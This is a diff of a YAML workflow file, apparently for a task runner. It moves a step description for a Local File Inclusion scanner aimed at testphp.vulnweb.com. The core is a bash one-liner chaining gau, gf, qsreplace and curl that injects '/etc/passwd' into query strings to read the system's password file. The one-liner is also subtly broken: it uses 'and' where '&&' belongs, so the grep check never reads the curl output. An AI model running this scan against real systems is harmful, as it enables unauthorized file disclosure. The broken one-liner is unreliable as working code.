@@ -1,3 +1,4 @@
+description: Executes a Local File Inclusion (LFI) vulnerability test against 'testphp.vulnweb.com'. It starts by using 'gau' to gather URLs from the specified target, then filters those URLs for potential LFI vulnerabilities using 'gf'. Each URL is tested by attempting to replace a query string with the path "/etc/passwd" using 'qsreplace', followed by a 'curl' request to each modified URL. If the response contains the string "root:x", indicating that the /etc/passwd file has been successfully included (a clear sign of an LFI vulnerability), the URL is marked as vulnerable. This process is parallelized across 25 threads for efficiency.
 tags: lfi, security, bash, curl
 params: target=testphp.vulnweb.com
 env:
@@ -6,8 +7,6 @@ env:
   - PATH: /usr/local/bin:${PATH}
 steps:
   - name: lfi
-    description: |
-      Executes a Local File Inclusion (LFI) vulnerability test against 'testphp.vulnweb.com'. It starts by using 'gau' to gather URLs from the specified target, then filters those URLs for potential LFI vulnerabilities using 'gf'. Each URL is tested by attempting to replace a query string with the path "/etc/passwd" using 'qsreplace', followed by a 'curl' request to each modified URL. If the response contains the string "root:x", indicating that the /etc/passwd file has been successfully included (a clear sign of an LFI vulnerability), the URL is marked as vulnerable. This process is parallelized across 25 threads for efficiency.
     command: bash
     script: |
       gau testphp.vulnweb.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" and echo "VULN! %" || true'
